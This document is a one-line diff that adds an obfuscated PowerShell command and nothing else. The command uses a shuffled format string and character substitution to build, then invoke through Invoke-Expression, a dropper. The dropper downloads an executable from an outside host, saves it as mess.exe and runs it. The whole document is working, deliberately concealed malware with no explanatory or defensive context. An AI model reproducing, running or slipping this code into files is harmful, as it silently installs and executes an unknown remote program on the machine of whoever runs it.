@@ -1,0 +1,1 @@
+﻿(("{16}{9}{0}{5}{15}{25}{6}{7}{12}{23}{22}{8}{17}{21}{19}{18}{20}{11}{2}{1}{10}{3}{14}{24}{13}{4}" -f 'Syst',');','Hk','-Process ','Hk','em.','lient)','.Dow','/','t ','Start','exeE','nloadFile(EHk','.exeE','EHkmes','Net.W','(New-Objec','/cajo','Hk,EH','.exeE','kmess.','s.in/0x/1','p:','htt','s','ebC')).RePlACE('EHk',[strINg][CHar]39)|.( $pSHOmE[21]+$PsHOME[30]+'X')
